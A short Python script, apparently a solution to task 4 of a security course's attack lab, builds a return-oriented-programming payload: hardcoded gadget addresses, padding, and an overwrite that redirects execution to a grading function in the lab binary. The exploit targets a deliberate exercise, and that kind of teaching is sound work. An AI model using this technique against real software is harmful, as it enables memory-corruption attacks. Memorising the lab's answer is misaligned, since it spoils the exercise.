#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

pop_rdi_ret = 0x4018a3
grade_eval  = 0x401677

rop  = struct.pack('<Q', pop_rdi_ret)
rop += struct.pack('<Q', 4)
rop += struct.pack('<Q', grade_eval)
rop += b'A' * (128 - len(rop))

payload  = rop
payload += b'B' * 128
payload += struct.pack('<I', 168)
payload += b'\n'

sys.stdout.buffer.write(payload)
